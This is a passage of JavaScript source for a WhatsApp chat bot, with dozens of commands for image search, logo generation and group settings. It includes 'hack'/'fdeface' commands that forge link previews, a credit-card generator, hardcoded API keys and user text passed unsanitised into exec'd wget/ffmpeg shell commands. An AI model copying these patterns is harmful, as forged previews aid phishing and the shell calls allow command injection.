emojix7 = emox7[Math.floor(Math.random() * emox7.length)]
const timestamp = speed();
const latensi = speed() - timestamp
tiringa.updatePresence(from, Presence.composing)
uptime = process.uptime()
speedo =`┏━━━━━━━━━━━━━━━
┃────「 *_ᴛᴇsᴛ_* 」─────
┃━━━━━━━━━━━━━━━
┠⊷️ *sᴘᴇᴇd* : ${latensi.toFixed(4)} _ᴍs_
┠⊷️ *ᴅᴀᴛe* : ${date}
┠⊷️ *ᴛɪᴍe* : ${hr}
┠⊷ *ᴜsᴇʀs* : ${_level.length} ᴜsᴇʀs
┠⊷⊷⊷⊷ *sʟᴏᴛ* ⊷⊷⊷⊷  
┃
┃ ${emojix7}   ${pingi} ◄━ ${emojix7} 
┗━━━━━━━━━━━━━━━`
tiringa.sendMessage(from, speedo, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `ayish aara athu ${pushname} aano :v`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./black.webp')}}}})
break
//_BUSCA IMAGEM NO PINTEREST		
case 'img':
case 'image':
case 'imagem':
msgFilter.isFiltered(from)
if (args.length < 1) return reply('Enter the command along with what you want to search for')
tiringa.updatePresence(from, Presence.composing)
reply(ptbr.wait())
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${args}`, {method: 'get'})
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
tiringa.sendMessage(from, pok, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: `I found this about: ${args}`})
} catch {
reply(`I didn’t find anything about ${agrs}...`)
}
break

//_LISTAR USUÁRIO ONLINE
case 'online':
msgFilter.isFiltered(from)
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(tiringa.chats.get(ido).presences), tiringa.user.jid]
tiringa.sendMessage(from, 'Online user list:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n`, text, { thumbnail: dnsnew, sendEphemeral: true,quoted: mek,
contextInfo: { mentionedJid: online }
})
break

//_NEKOS PINTEREST
case 'neko':
msgFilter.isFiltered(from)
tiringa.updatePresence(from, Presence.composing)
uk = ["anime neko"]
nk = uk[Math.floor(Math.random() * uk.length)]
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(ptbr.wait())
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
tiringa.sendMessage(from, pok, image, {
thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: `nyan`
})
} catch {
reply(ptbr.erro())
}
break

//_LOLIS PINTEREST
case 'loli':
msgFilter.isFiltered(from)
tiringa.updatePresence(from, Presence.composing)
uk = ["anime loli"]
nk = uk[Math.floor(Math.random() * uk.length)]
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(ptbr.wait())
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
tiringa.sendMessage(from, pok, image, {
thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: `nii?`
})
} catch {
reply(ptbr.erro())
}
break

//_SHITPOST PINTEREST
case 'shitpost':
case 'shit':
msgFilter.isFiltered(from)
tiringa.updatePresence(from, Presence.composing)
uk = ["shitpost br"]
nk = uk[Math.floor(Math.random() * uk.length)]
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(ptbr.wait())
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
tiringa.sendMessage(from, pok, image, {
thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: `إذا قمت بترجمة هذا فأنت سارق🤣👆`
})
} catch {
reply(ptbr.erro())
}
break
case 'hack':
			if (!isOwner) return reply(ptbr.ownerB()) //owner only
				if (args.length == 0) return reply(from, `Use ${prefix}hack url|title|desc|url\n\nExample : ${prefix}fdeface https://google.com|White walker|bot|https://icici.com`, mek)
				argz = args.split("|")
				if (!argz) return reply(from, `Use ${prefix}hack url|title|desc|url\n\nExample : ${prefix}fdeface https://google.com|white walker|bot|https://icici.com`, mek)
				if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					let media = await tiringa.downloadMediaMessage(encmedia)
					mek.sendFakeThumb(from, argz[0], argz[1], argz[2], argz[3], media)
				} else {
					mek.sendFakeThumb(from, argz[0], argz[1], argz[2], argz[3])
				}
				break
case 'fdeface':
					 nn = body.slice(9)
                                 urlnye = nn.split("|")[0];
                                 titlenye = nn.split("|")[1];
                                 descnye = nn.split("|")[2];
                                imgbbb = require('imgbb-uploader')
                                run = getRandom('.jpeg')
                                encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                media = await tiringa.downloadAndSaveMediaMessage(encmedia)
                                ddatae = await imageToBase64(JSON.stringify(media).replace(/\"/gi, ''))
                                tiringa.sendMessage(from, {
                                        text: `${urlnye}`,
                                        matchedText: `${urlnye}`,
                                        canonicalUrl: `${urlnye}`,
                                        description: `${descnye}`,
                                        title: `${titlenye}`,
                                        jpegThumbnail: ddatae
                                }, 'extendedTextMessage', { detectLinks: false })
                                break

//_ANIME PINTEREST
case 'anime':
msgFilter.isFiltered(from)
tiringa.updatePresence(from, Presence.composing)
am = ["anime tumblr",
"wallpaper anime hd",
"anime aestethic",
"anime hd"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(ptbr.wait())
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
tiringa.sendMessage(from, pok, image, {
thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: `💮`
})
break

//_PROCURA WALLPAPER NO PINTEREST
case 'wp':
case 'wallpaper':
msgFilter.isFiltered(from)
tiringa.updatePresence(from, Presence.composing)
pw = ["wallpaper aestethic",
"wallpaper tumblr",
"wallpaper lucu",
"wallpaper"]
nk = pw[Math.floor(Math.random() * pw.length)]
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(ptbr.wait())
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
tiringa.sendMessage(from, pok, image, {
thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: `Liked what I chose?`
})
} catch {
reply(ptbr.erro())
}
break

case 'nomeninja':
msgFilter.isFiltered(from)
  if (args.length < 1) return reply('write your name')
tiringa.updatePresence(from, Presence.composing)
nome = body.slice(10)
try {
data = await fetchJson(`https://api.terhambar.com/ninja?nama=${nome}`)
hasil = `Your ninja name:\n\n${data.result.ninja}`
reply(hasil)
} catch {
  reply(ptbr.erro())
}
break

case 'nsfw':
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
//if (!isOwner) return reply(ptbr.ownerB())
if (args.length < 1) return reply(`type it ${prefix}nsfw 1 to activate`)
if (Number(args[0]) === 1) {
if (isNsfw) return reply('❎NSFW is already active in the group❎')
nsfw.push(from)
fs.writeFileSync('./data/nsfw.json', JSON.stringify(nsfw))
reply('✅NSFW functions activated in this group✅')
} else if (Number(args[0]) === 0) {
nsfw.splice(from, 1)
fs.writeFileSync('./data/nsfw.json', JSON.stringify(nsfw))
reply('🚫NSFW functions disabled in this group🚫')
} else {
reply(`type it ${prefix}nsfw 1 to enable, 0 to disable the feature`)
}
break
                   
case 'leveis':
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (args.length < 1) return reply(`Type correctly:\nCommand: ${prefix}leveis 1, to enable and 0 to disable`)
if (Number(args[0]) === 1) {
if (isLevelingOn) return reply('❎the LEVELS function is already activated in the group❎')
_leveling.push(from)
fs.writeFileSync('./data/leveling.json', JSON.stringify(_leveling))
reply('✅the LEVELS function has been activated✅')
} else if (Number(args[0]) === 0) {
_leveling.splice(from, 1)
fs.writeFileSync('./datauser/leveling.json', JSON.stringify(_leveling))
reply('❌the LEVELS function has been deactivated❌')
} else {
reply(`Type in the correct form: \ nCommand: ${prefix}levels 1, to activate and 0 to disable`)
}
break

case 'setppgc':
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (!isBotGroupAdmins) return reply(ptbr.Badmin())
const ftgp = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
const medipp = await tiringa.downloadAndSaveMediaMessage(ftgp)
await tiringa.updateProfilePicture (from, medipp)
reply('✅group photo changed✅')
break

case 'triggered':
case 'ger':
msgFilter.isFiltered(from)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
reply(ptbr.waitimg())
owgi = await tiringa.downloadAndSaveMediaMessage(ger)
anu = await imgbb("0c419be2e8bfc27eff00147b0c763418", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply(ptbr.stick())
nobg = fs.readFileSync(rano)
tiringa.sendMessage(from, nobg, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
fs.unlinkSync(rano)
})                               
} else {
reply('You need to tag or upload an image for this')
}
break
case 'dance':
                    case 'spider':
                    case 'blackbird':
                    case 'wroom':
                    case 'surfboard':
                    case 'orlando':
                    case 'trance':         
				{
				reply(ptbr.wait())
                    if (args.length == 0) return reply(`Example: ${prefix + command} loop`) 
                    ini_txt2 = args.join(" ") 
                    ranp = getRandom('.png')
			rano = getRandom('.webp')
		        
                    hasil = `https:\/\/bx-hunter.herokuapp.com/api/flamingtext/${command}?text=${ini_txt2}&apikey=ikygan`
			exec(`wget ${hasil} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (e) => {
			fs.unlinkSync(ranp)
			if (e) return reply(ptbr.wait())
			buffer = fs.readFileSync(rano)
			tiringa.sendMessage(from, buffer, sticker)
			fs.unlinkSync(rano)
			})
			}
			break
          //anu1 = `https://bx-hunter.herokuapp.com/api/flamingtext/${command}?text=${ini_txt2}&apikey=ikygan`
          
case 'tourl':
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
reply(ptbr.wait())
owgi = await tiringa.downloadAndSaveMediaMessage(ger)
anu = await imgbb("0c419be2e8bfc27eff00147b0c763418", owgi)
imurl = `${anu.display_url}`
reply(imurl)
}
break

case 'wasted':
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
reply(ptbr.waitimg())
owgi = await tiringa.downloadAndSaveMediaMessage(ger)
anu = await imgbb("0c419be2e8bfc27eff00147b0c763418", owgi)
imgwas = `${anu.display_url}`
hehe = await getBuffer(`https://some-random-api.ml/canvas/wasted?avatar=${imgwas}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
} else {
reply('You need to tag or send an image')
}
break

case 'drawing':
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
reply(ptbr.waitimg())
owgi = await tiringa.downloadAndSaveMediaMessage(ted)
tels = body.slice(7)
anu = await imgbb("0c419be2e8bfc27eff00147b0c763418", owgi)
hehe = await getBuffer(`https://videfikri.com/api/textmaker/pencil/?urlgbr=${anu.display_url}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
} else {
reply('You need to tag or send an image')
}
break

case 'wanted':
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
if (args.length < 1) return reply(`Type some text for this`)
wtext = body.slice(7)
reply(ptbr.waitimg())
owgi = await tiringa.downloadAndSaveMediaMessage(ted)
anu = await imgbb("0c419be2e8bfc27eff00147b0c763418", owgi)
hehe = await getBuffer(`https://videfikri.com/api/textmaker/wanted/?urlgbr=${anu.display_url}&text1=${wtext}&text2=10000`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
} else {
reply('You need to tag or send an image')
}
break

case '8bit':
msgFilter.isFiltered(from)
if (!q.includes('|')) return reply(`Type correctly:\nCommand: ${prefix}8bit text1|text2`)
reply(ptbr.waitimg())
pc = body.slice(5)
tx1 = pc.split("|")[0];
tx2 = pc.split("|")[1];
hehe = await getBuffer(`https://videfikri.com/api/textmaker/8bit/?text1=${tx1}&text2=${tx2}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'bneon':
msgFilter.isFiltered(from)
if (args.length < 1) return reply('type some text for that')
pc = body.slice(6)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://api.zeks.xyz/api/bneon?apikey=apivinz&text=${pc}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break
		
case 'luzneon':
msgFilter.isFiltered(from)
if (args.length < 1) return reply('type some text for that')
pc = body.slice(8)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://docs-jojo.herokuapp.com/api/neon_light?text=${pc}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'matrix':
msgFilter.isFiltered(from)
if (args.length < 1) return reply('type some text for that')
pc = body.slice(7)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://api.zeks.xyz/api/matrix?apikey=apivinz&text=${pc}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'breakwall':
msgFilter.isFiltered(from)
if (args.length < 1) return reply('type some text for that')
pc = body.slice(10)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://api.zeks.xyz/api/breakwall?apikey=apivinz&text=${pc}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'dropwater':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(10)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://api.zeks.xyz/api/dropwater?apikey=apivinz&text=${pc}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break
case 'smoke':
					case 'camuflage':
					case 'stars':
					case '3dglowing':
					case 'underwaterocean':
					case 'wolfmetal':
					case 'rainbowshine':
                    if (args.length == 0) return reply(`Example: ${prefix + command} test`)
                    teka = args.join(" ")
                    castlepur = await getBuffer(`https://api.xteam.xyz/photooxy/wolfmetal?text=${teka}&APIKEY=7415bc4287ad5ca8`)
                    tiringa.sendMessage(from, castlepur, image, { thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
                    break
                    case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
				reply(`wait`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} testing`)
                    txt1 = args[0]
                    txt2 = args[1]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome2/${command}?apikey=b170074ac846042f35937286&text1=${txt1}&text2=${txt2}`)
                    tiringa.sendMessage(from, ini_buffer, image, { thumbnail: dnsnew, sendEphemeral: true,quoted: mek })
                    break
case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
                
				reply(ptbr.wait())
                    if (args.length == 0) return reply(`Example: ${prefix + command} ser`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolhumankey}&text=${ini_txt}`)
                    tiringa.sendMessage(from, ini_buffer, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
                    break
case 'wolflo':
if (args.length < 1) return reply(`Type correctly:\nCommand: ${prefix}wolflogo text1|text2`)
if (!q.includes('|')) return reply(`Type correctly:\nCommand: ${prefix}wolflogo text1|text2\nNão esqueça do: | `)
pc = body.slice(9)
tx1 = pc.split("|")[0];
tx2 = pc.split("|")[1];
reply(ptbr.waitimg())
hehe = await getBuffer(`https://api.zeks.xyz/api/wolflogo?apikey=apivinz&text1=${tx1}&text2=${tx2}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break
		
///_photoOXY
case 'flowertext':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(11)
reply(ptbr.waitimg())
hehe = fetchJson(`https://api.zeks.xyz/api/flowertext?text=${pc}&apikey=apivinz`)
heh = await getBuffer(hehe.result)
tiringa.sendMessage(from, heh, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break
///_photoOXY

case 'lovepaper':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(10)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://videfikri.com/api/textmaker/lovemek/?text=${pc}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'tfire':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(6)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://api.zeks.xyz/api/tfire?text=${pc}&apikey=apivinz`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'sandw':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(6)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://api.zeks.xyz/api/sandw?apikey=apivinz&text=${pc}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'firofiro':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(9)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://api.zeks.xyz/api/epep?text=${pc}&apikey=apivinz`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'text3d2':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(8)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://api.zeks.xyz/api/text3dbox?apikey=apivinz&text=${pc}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'text3d':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(7)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://api.zeks.xyz/api/text3d?text=${pc}&apikey=apivinz`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'phlogo':
if (args.length < 1) return reply('type some text for that')
if (!q.includes('|')) return reply(`Type correctly:\nCommand: ${prefix}phlogo text1|text2\nNão esqueça do: | `)
pc = body.slice(7)
tx1 = pc.split("|")[0];
tx2 = pc.split("|")[1];
reply(ptbr.waitimg())
hehe = await getBuffer(`https://api.zeks.xyz/api/phlogo?text1=${tx1}&text2=${tx2}&apikey=apivinz`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'bpmek':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(6)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://api.zeks.xyz/api/logobp?text=${pc}&apikey=apivinz`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'folhas':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(7)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://api.zeks.xyz/api/leavest?text=${pc}&apikey=apivinz`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'tlight':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(7)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://api.zeks.xyz/api/tlight?text=${pc}&apikey=apivinz`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break


case 'narutobanner':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(14)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://videfikri.com/api/textmaker/narutobanner/?text=${pc}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'romancetext':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(12)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://videfikri.com/api/textmaker/romancetext/?text=${pc}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'shadowtext':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(11)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://videfikri.com/api/textmaker/shadowtext/?text=${pc}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'tiktokeffect':
if (args.length < 1) return reply(`Type correctly:\nCommand: ${prefix}tiktokeffect text1|text2`)
if (!q.includes('|')) return reply(`Type correctly:\nCommand: ${prefix}tiktokeffect text1|text2`)
pc = body.slice(13)
nomor = pc.split("|")[0];
pesan = pc.split("|")[1];
if (nomor.length >= 9 ) return reply(`Text 1 maximum 9 characters`)
if (pesan.length >= 35 ) return reply(`Text 2 maximum 35 characters`)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://videfikri.com/api/textmaker/tiktokeffect/?text1=${nomor}&text2=${pesan}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'neon':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(5)
if (pc.length >= 80 ) return reply(`Maximum 80 characters`)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://videfikri.com/api/textmaker/glowingneon/?text=${pc}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'hpotter':
if (args.length < 1) return reply('type some text for that')
pc = body.slice(8)
reply(ptbr.waitimg())
hehe = await getBuffer(`https://videfikri.com/api/textmaker/hpotter/?text=${pc}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'cep':
if (args.length < 1) return reply('type the zip code you want to search')
cep = body.slice(4)
hehe = await fetchJson(`https://brasilapi.com.br/api/cep/v1/${cep}`)
if (hehe.error) return reply(hehe.error)
ccg =
` CEP INFORMATION
  ‣ Cep: ${hehe.cep}
  ‣ state: ${hehe.state}
  ‣ City: ${hehe.city}`
tiringa.sendMessage(from, ccg, text, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'ddd':
if (args.length < 1) return reply('type the ddd you want to search')
ddd = body.slice(4)
hehe = await fetchJson(`https://brasilapi.com.br/api/ddd/v1/${ddd}`)
if (hehe.error) return reply(hehe.error)
ccg =
` DDD INFORMATION
  ‣ state: ${hehe.state}
  ‣ Cities: 
    ${hehe.cities}\n`
tiringa.sendMessage(from, ccg, text, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'car1d':
case 'card1':
hehe = await fetchJson(`https://videfikri.com/api/ccgenerator/`)
if (hehe.error) return reply(hehe.error)
ccg =
` Cartão gerado com sucesso
   ‣ Bandeira: ${hehe.result.card.network}
   ‣ Número: ${hehe.result.card.number}
   ‣ Cvv: ${hehe.result.card.cvv}
   ‣ Pin: ${hehe.result.card.pin}
   ‣ Balanço: ${hehe.result.card.balance}
   ‣ Validade: ${hehe.result.card.expiration_month}/${hehe.result.card.expiration_year}`
tiringa.sendMessage(from, ccg, text, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'neve':
try {  
if (args.length < 1) return reply(`Type correctly:\nCommand: ${prefix}neve text1|text2`)
if (!q.includes('|')) return reply(`Type correctly:\nCommand: ${prefix}neve text1|text2`)
pc = body.slice(5)
  tx1 = pc.split("|")[0];
  tx2 = pc.split("|")[1];
reply(ptbr.waitimg())
haha = await fetchJson(`https://api.zeks.xyz/api/snowwrite?text1=${tx1}&text2=${tx2}&apikey=apivinz`)
hehe = await getBuffer(haha.result)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error has occurred❌')
}
break

case 'crismes':
try {  
if (args.length < 1) return reply(`Type correctly:\nCommand: ${prefix}crismes text`)
pc = body.slice(8)
reply(ptbr.waitimg())
haha = await fetchJson(`https://api.zeks.xyz/api/crismes?text=${pc}&apikey=apivinz`)
hehe = await getBuffer(haha.result)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error has occurred❌')
}
break

case 'pubglogo':
try {  
if (args.length < 1) return reply(`Type correctly:\nCommand: ${prefix}retro text1|text2|text3`)
pc = body.slice(9)
tx1 = pc.split("|")[0];
tx2 = pc.split("|")[1];
reply(ptbr.waitimg())
haha = await fetchJson(`https://api.zeks.xyz/api/pubglogo?text1=${tx1}&text2=${tx2}&apikey=apivinz`)
hehe = await getBuffer(haha.result)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error has occurred❌')
}
break

case 'bf4':
try {  
if (args.length < 1) return reply(`Type correctly:\nCommand: ${prefix}retro text1|text2|text3`)
pc = body.slice(4)
tx1 = pc.split("|")[0];
tx2 = pc.split("|")[1];
reply(ptbr.waitimg())
haha = await getBuffer(`https://videfikri.com/api/textmaker/bf4/?text1=${tx1}&text2=${tx2}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error has occurred❌')
}
break

case 'nezuko':
msgFilter.isFiltered(from)
try {
hah = await fetchJson(`https://kagchi-api.glitch.me//waifu/nezuko`)
hehe = await getBuffer(hah.url)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error has occurred❌')
}
break

case 'cslogo':
try {  
if (args.length < 1) return reply(`Type correctly:\nCommand: ${prefix}cslogo text`)
pc = body.slice(6)
reply(ptbr.waitimg())
haha = await fetchJson(`https://api.zeks.xyz/api/cslogo?text=${pc}&apikey=apivinz`)
hehe = await getBuffer(haha.result)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error has occurred❌')
}
break

case 'lithgtext':
try {  
if (args.length < 1) return reply(`Type correctly:\nCommand: ${prefix}lithgtext text`)
pc = body.slice(10)
reply(ptbr.waitimg())
